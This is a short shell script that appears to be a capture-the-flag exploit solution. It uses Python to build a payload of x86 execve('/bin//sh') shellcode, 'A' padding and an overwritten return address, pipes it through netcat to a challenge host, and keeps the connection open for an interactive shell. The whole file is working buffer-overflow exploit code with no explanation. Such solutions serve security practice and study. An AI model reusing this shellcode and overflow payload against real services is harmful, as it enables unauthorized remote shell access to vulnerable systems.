#!/bin/sh


( python << EOF; cat - ) | nc pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one 1234

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73" +
             "\x68\x68\x2f\x62\x69\x6e\x89" +
             "\xe3\x89\xc1\x89\xc2\xb0\x0b" +
             "\xcd\x80\x31\xc0\x40\xcd\x80" )

print "X\n" + "y" + shellcode + "A"*(255-len(shellcode)) + "\xe1\x92\x04\x08"
EOF
